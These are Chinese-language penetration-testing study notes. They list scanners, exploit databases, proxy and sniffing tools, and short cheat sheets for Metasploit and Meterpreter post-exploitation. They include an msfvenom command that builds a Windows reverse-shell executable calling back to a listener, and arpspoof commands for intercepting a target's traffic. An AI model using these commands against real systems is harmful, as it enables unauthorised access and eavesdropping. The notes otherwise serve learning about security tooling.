# ceshi

---

一、Nmap可用于判定网络的布局，可以在网络上使用 Nmap 来查找主机系统以及打开这些系统的端口。

二、Nessus目前全世界最多人使用的系统漏洞扫描与分析软件。Nessus是一个可提供全方位服务的安全扫描程序。与其他的扫描软件一样，Nessus只能在其依赖的签名数据库中发挥作用。Nessus会时常更新，且具有全面报告、主机扫描以及实时漏洞搜索的功能。

三、OpenVAS一套可用于扫描漏洞和全面漏洞管理的工具和服务系统。 OpenVAS 的核心功能是其所提供的安全扫描器，可使用超过 33,000 每日更新的网络漏洞测试。

四、Niktou是一款杰出的“ 通用网关接口 ”(CGI，common gateway interface) 脚本扫描器。 Nikto 不仅可用于检查 CGI 漏洞，还可以躲避的方式运行，以便躲避入侵探测系统。

---
漏洞发布网站
 
https://www.seebug.org/

https://www.exploit-db.com/

---

Firefox下

    Firebug，调试js，HTTP请求响应观察，Cookie，DOM树观察等；GreaseMonkey，自己改了个Cookie修改脚本，其他同学可以用这款：Original Cookie Injector for Greasemonkey；Noscript，进行一些js的阻断；AutoProxy，翻墙必备；

Chrome下

    F12打开开发者工具，功能==Firebug+本地存储观察等；SwichySharp，翻墙必备；Cookie修改脚本，自己写了一个Chrome扩展（已开源：Cookie利用神器：CookieHacker），其他同学可以自己到Chrome扩展搜个好用的；

前端渗透工具

    

HTTP代理工具

    Fiddler，即可，不用再寻找其他的了，watcher插件漏洞
    
    Burp Suite，HTTP代理，还有爬虫、漏洞扫描、渗透、爆破等功能

漏洞扫描工具

    AWVS，不仅漏扫方便，
    
    Python自写脚本/工具
    
    Nmap，绝对不仅仅是端口扫描,脚本

漏洞利用

    sqlmap，SQL注入利用
    
    Metasploit，主机渗透框架，；
    
    Hydra，爆破必备；

抓包工具

    Wireshark，抓包必备；tcpdump，Linux下命令行抓包，结果可以给Wireshark分析；

大数据平台

    ZoomEye，知道创宇开放的一个网络空间搜索引擎，搜搜组件就知道：ZoomEye（钟馗之眼），可以认为我在广告；SHODAN， 老外开放的一个网络空间搜索引擎，搜搜主机设备就知道：SHODAN – Computer Search Engine；Google，：）

熟练Linux众多命令+Vim

---

# Metasploit

---

search cve:2009 type:exploit app:client

info 展示相关信息

show advanced 列出所有高级配置

check 检车目标是否选定渗透攻击存在相应安全漏洞


---

# Metgetpid

注入进程　migrate 

上传文件  　upload　　

下载文件　　 download 

session -l 列出可用的交互会话

session -i number 选定会话

获取最高权限  sysinfo getsystem 

---
# msfvenom 

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=4444 -f exe -o back.exe

---

# Arp

apt install dsniff ssldump

arpspoof -i eth0 -t 目标IP 目标网关IP

echo 1 > /proc/sys/net/ipv4/ip_forwardd

driftnet -i eth0
